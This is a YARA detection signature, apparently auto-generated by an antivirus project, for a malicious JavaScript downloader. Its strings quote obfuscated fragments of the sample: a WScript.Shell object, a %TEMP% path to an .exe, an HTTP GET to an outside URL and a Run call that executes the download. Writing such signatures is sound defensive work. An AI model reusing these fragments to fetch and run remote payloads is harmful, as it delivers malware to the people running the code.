rule sig_20160328_7a79e8e5fa44bfedaae0ab9a337296d4 {
  meta:
    description = "datamaliciousorder - file 20160328_7a79e8e5fa44bfedaae0ab9a337296d4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7d5f3080a32f12c2b9730e4e6d76216fa7789fd109b64554ce04ae8c3304c19d"

  strings:
    $s1  = "function Jockt() {return Ljeshcapcs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nPWE9dE16z.exe\";};" fullword ascii
    $s2  = "do {WScript[Mksajs](Akemps() * 11)} while (Liirlz[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Liirlz[Vboee](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s4  = "function Rfbszsz(Iumxxafclf, Atgfsrmus){return Iumxxafclf - Atgfsrmus;};" fullword ascii
    $s5  = "var Ljeshcapcs = function Dshhs() {return WScript[Haffooycb](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xnfvkgkqdq(){return Haffooycb;};" fullword ascii
    $s7  = "Jndxkwsx = true; " fullword ascii
    $s8  = "function Akemps(){return 22;};" fullword ascii
    $s9  = "function Grdegorg(){return Lzimiyu;};" fullword ascii
    $s10 = "function Achvnfxf()" fullword ascii
    $s11 = "return Rfbszsz(Ywkveface, Sjclyaxg);" fullword ascii
    $s12 = " while (Gcpmykme){" fullword ascii
    $s13 = "var Yxrnidl = false;" fullword ascii
    $s14 = "var Xqxuodxo = new this[\"Date\"]();" fullword ascii
    $s15 = "function Bzehfaomdz(Piamcza) {var Gxzshojile = (1, 2, 3, 4, 5, Piamcza); return Gxzshojile;};" fullword ascii
    $s16 = "Yxrnidl = true; " fullword ascii
    $s17 = "var Jndxkwsx = false;" fullword ascii
    $s18 = "var Jtkjdjqui = false;" fullword ascii
    $s19 = "function Ctcai() {return ((Jndxkwsx == true) && (Jndxkwsx == Yxrnidl)) ? 1 : Zmiellbibj;};" fullword ascii
    $s20 = "function Kwxmyktopr(Dksvuy){Ljeshcapcs[\"Run\"](Dksvuy, Zmiellbibj, Zmiellbibj);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}